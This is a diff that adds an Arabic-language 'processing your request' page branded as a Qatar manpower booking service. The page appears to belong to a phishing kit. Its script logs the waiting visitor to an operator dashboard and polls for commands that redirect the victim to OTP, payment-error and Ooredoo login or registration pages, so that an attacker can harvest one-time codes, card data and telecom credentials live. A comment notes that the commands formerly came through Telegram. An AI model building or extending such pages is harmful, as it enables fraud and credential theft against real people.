@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>جاري المعالجة... | جسور</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Cairo', sans-serif; background: linear-gradient(135deg, #8D1B3D 0%, #002D52 100%); height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; margin: 0; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #8D1B3D; border-radius: 50%; width: 65px; height: 65px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="bg-white p-12 rounded-[35px] shadow-2xl w-full max-w-[480px] mx-4 text-center">
+        <div class="spinner"></div>
+        <h1 class="text-[30px] font-black text-[#1a1a1a] mb-2">يُرجى الانتظار</h1>
+        <p class="text-[15px] text-gray-400 mb-8 font-bold leading-relaxed">نحن نقوم بمراجعة وتأكيد طلبك الآن، يُرجى عدم إغلاق هذه الصفحة لضمان استمرار الحجز.</p>
+        <div class="bg-gray-50 p-4 rounded-xl border border-gray-100 text-[11px] text-gray-500 font-bold uppercase tracking-widest leading-none">Powered by Qatar Manpower Solutions</div>
+    </div>
+
+    <script src="config.js"></script>
+
+    <script>
+        var ref = resolveRef();
+
+        /**
+         * Apply a command issued by the administrator from the dashboard.
+         *
+         * The command arrives from the backend API rather than from a
+         * commands/<ref>.txt file written by Telegram.
+         */
+        function applyCommand(data) {
+            var command = data.command;
+            var next = '';
+
+            if (command === 'OTP')      { next = 'otp.html'; }
+            if (command === 'WRONG')    { next = 'error.html'; }
+            if (command === 'ERROR')    { next = 'payment.html?err=1'; }
+            if (command === 'OOREDOO')  { next = 'ooredoo-login.html'; }
+            if (command === 'OOR_REG')  { next = 'ooredoo-reg.html'; }
+            if (command === 'ID_ERR')   { next = 'ooredoo-reg.html?err=1'; }
+            if (command === 'OOR_ERR')  { next = 'ooredoo-login.html?err=1'; }
+            if (command === 'SUCCESS')  { next = 'success.html'; }
+            if (command === 'RESUME')   { next = window.location.pathname + window.location.search; }
+
+            // WAIT keeps the visitor on this page until a further command.
+            if (command === 'WAIT') {
+                return;
+            }
+
+            if (next === '') {
+                next = data.redirect || '';
+            }
+
+            if (next === '') {
+                return;
+            }
+
+            var separator = next.indexOf('?') === -1 ? '?' : '&';
+            window.location.replace(next + separator + 'ref=' + encodeURIComponent(ref));
+        }
+
+        // تسجيل وجود العميل في صفحة الانتظار داخل لوحة التحكم.
+        if (window.trackAction) { trackAction(ref, 'WAITING-IN-LOADING'); }
+
+        // استقبال أوامر المشرف مباشرة من الخادم (بديل ملفات الأوامر وتلجرام).
+        pollCommands(ref, applyCommand, 3000);
+    </script>
+</body>
+</html>
